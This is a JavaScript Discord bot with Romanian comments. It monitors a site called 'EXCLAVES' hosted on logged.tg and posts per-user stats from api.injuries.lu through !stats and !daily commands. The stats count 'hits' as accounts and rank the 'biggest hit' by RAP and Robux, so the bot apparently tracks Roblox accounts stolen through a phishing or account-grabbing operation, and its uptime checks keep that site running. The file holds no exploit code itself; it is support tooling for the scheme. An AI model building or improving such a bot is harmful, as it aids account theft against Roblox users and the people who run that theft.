// 1️⃣ Importuri
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const fetch = require('node-fetch');
const express = require('express');

// 2️⃣ Server Express pentru keep-alive
const app = express();
const PORT = process.env.PORT || 3000;
app.get("/", (req, res) => res.send("Bot is alive ✅"));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

// 3️⃣ Creezi clientul Discord
const client = new Client({ 
  intents: [
    GatewayIntentBits.Guilds, 
    GatewayIntentBits.GuildMessages, 
    GatewayIntentBits.MessageContent
  ] 
});

const TOKEN = process.env.DISCORD_BOT_TOKEN;

// 4️⃣ Funcții utile
function formatNumber(num) { return num?.toLocaleString() || "0"; }
function formatDuration(ms) {
  let sec = Math.floor(ms / 1000);
  let min = Math.floor(sec / 60);
  let hr = Math.floor(min / 60);
  sec %= 60; min %= 60;
  return `${hr}h ${min}m ${sec}s`;
}

// 4.1️⃣ Helper fetch cu timeout
async function fetchWithTimeout(url, options = {}, timeout = 10000) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeout);
  options.signal = controller.signal;
  try {
    const res = await fetch(url, options);
    return res;
  } catch {
    return null; // Dacă fetch eșuează
  } finally {
    clearTimeout(id);
  }
}

// 5️⃣ Config monitorizare
let lastStatus = null;
const STATUS_CHANNEL_ID = "1437881455534674001"; // Canalul pentru anunțuri
const MAIN_SITE_URL = "https://www.logged.tg/auth/exclaves";
const MAIN_SITE_NAME = "EXCLAVES";

// Funcție pentru embed status site
async function sendStatusEmbed(channel, status, ping) {
  const embed = new EmbedBuilder()
    .setColor(0x800080) // Purple la toate embedurile
    .setThumbnail("https://cdn.discordapp.com/emojis/1418958212195156120.gif") // purple crown
    .setDescription(`-- <a:breezy:1396413730757017692> **${MAIN_SITE_NAME} STATUS** <a:breezy:1396413730757017692> --\n\n
<a:Animated_Arrow_Purple:1418940595782549636> STATUS: ${status}\n
<a:Animated_Arrow_Purple:1418940595782549636> Response Time: ${ping ? ping + "ms" : "N/A"}`)
    .setImage("https://i.imgur.com/bnuEGXF.gif")
    .setFooter({ text: "EXCLAVES Site Monitor" });

  await channel.send({ embeds: [embed] });
}

// 5.1️⃣ Monitorizare automată la 30 secunde
setInterval(async () => {
  try {
    const start = Date.now();
    const response = await fetchWithTimeout(MAIN_SITE_URL);
    let currentStatus = response && response.ok ? "UP" : "DOWN";
    let ping = response && response.ok ? Date.now() - start : null;

    if (currentStatus !== lastStatus) {
      const channel = await client.channels.fetch(STATUS_CHANNEL_ID).catch(() => null);
      if (channel) {
        await sendStatusEmbed(channel, currentStatus, ping);
      }
      lastStatus = currentStatus;
    }
  } catch (err) {
    console.error("Error in auto-monitor:", err);
  }
}, 30000);

// 6️⃣ Event listener pentru comenzi
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  const args = message.content.split(" ");
  const command = args[0].toLowerCase();
  let targetUser = message.mentions.users.first() || message.author;
  const targetId = targetUser.id;

  // ===== !stats =====
  if (command === '!stats') {
    try {
      const res = await fetchWithTimeout(`https://api.injuries.lu/v1/public/user?userId=${targetId}`);
      if (!res) return message.reply("❌ Could not fetch stats.");
      const data = await res.json();
      if (!data.success || !data.Normal) return message.reply("❌ No stats found.");

      const normal = data.Normal;
      const profile = data.Profile || {};
      const userName = profile.userName || targetUser.username;

      const embed = new EmbedBuilder()
        .setColor(0x800080) // Purple
        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
        .setDescription(`-- <a:breezy:1396413730757017692> **EXCLAVES STATS** <a:breezy:1396413730757017692> --\n\n
<a:Animated_Arrow_Purple:1418940595782549636> **User:** ${userName}\n
<a:Animated_Arrow_Purple:1418940595782549636> **TOTAL STATS:** Hits: ${formatNumber(normal.Totals?.Accounts)}, Visits: ${formatNumber(normal.Totals?.Visits)}, Clicks: ${formatNumber(normal.Totals?.Clicks)}\n
<a:Animated_Arrow_Purple:1418940595782549636> **BIGGEST HIT:** Summary: ${formatNumber(normal.Highest?.Summary)}, RAP: ${formatNumber(normal.Highest?.Rap)}, Robux: ${formatNumber(normal.Highest?.Balance)}\n
<a:Animated_Arrow_Purple:1418940595782549636> **TOTAL HIT STATS:** Summary: ${formatNumber(normal.Totals?.Summary)}, RAP: ${formatNumber(normal.Totals?.Rap)}, Robux: ${formatNumber(normal.Totals?.Balance)}`)
        .setImage("https://i.imgur.com/bnuEGXF.gif")
        .setFooter({ text: "EXCLAVES Stats Bot" });

      await message.channel.send({ embeds: [embed] });

    } catch (err) {
      console.error('Error fetching stats:', err);
      message.reply("❌ Error fetching stats.");
    }
  }

  // ===== !daily =====
  if (command === '!daily') {
    try {
      const res = await fetchWithTimeout(`https://api.injuries.lu/v2/daily?type=0x2&cs=3&ref=exclaves&userId=${targetId}`);
      if (!res) return message.reply("❌ Could not fetch daily stats.");
      const data = await res.json();
      if (!data.success) return message.reply("❌ No daily stats found.");

      const daily = data.Daily || data.Normal;
      const profile = data.Profile || {};
      const userName = profile.userName || targetUser.username;

      const embed = new EmbedBuilder()
        .setColor(0x800080) // Purple
        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
        .setDescription(`-- <a:breezy:1396413730757017692> **EXCLAVES DAILY** <a:breezy:1396413730757017692> --\n\n
<a:Animated_Arrow_Purple:1418940595782549636> **User:** ${userName}\n
<a:Animated_Arrow_Purple:1418940595782549636> **DAILY STATS:** Hits: ${formatNumber(daily.Totals?.Accounts)}, Visits: ${formatNumber(daily.Totals?.Visits)}, Clicks: ${formatNumber(daily.Totals?.Clicks)}\n
<a:Animated_Arrow_Purple:1418940595782549636> **BIGGEST HIT:** Summary: ${formatNumber(daily.Highest?.Summary)}, RAP: ${formatNumber(daily.Highest?.Rap)}, Robux: ${formatNumber(daily.Highest?.Balance)}\n
<a:Animated_Arrow_Purple:1418940595782549636> **TOTAL HIT STATS:** Summary: ${formatNumber(daily.Totals?.Summary)}, RAP: ${formatNumber(daily.Totals?.Rap)}, Robux: ${formatNumber(daily.Totals?.Balance)}`)
        .setImage("https://i.imgur.com/bnuEGXF.gif")
        .setFooter({ text: "EXCLAVES Daily Stats" });

      await message.channel.send({ embeds: [embed] });

    } catch (err) {
      console.error('Error fetching daily stats:', err);
      message.reply("❌ Error fetching daily stats.");
    }
  }

  // ===== !check =====
  if (command === '!check') {
    try {
      const start = Date.now();
      const response = await fetchWithTimeout(MAIN_SITE_URL);
      let currentStatus = response && response.ok ? "UP" : "DOWN";
      let ping = response && response.ok ? Date.now() - start : null;

      await sendStatusEmbed(message.channel, currentStatus, ping);

    } catch (err) {
      console.error(err);
      message.reply("❌ Error checking site.");
    }
  }
});

// 7️⃣ Error handler
client.on('error', (err) => console.error("Discord client error:", err));

// 8️⃣ Login
if (!TOKEN) { console.error("❌ DISCORD_BOT_TOKEN not set!"); process.exit(1); }
client.login(TOKEN);
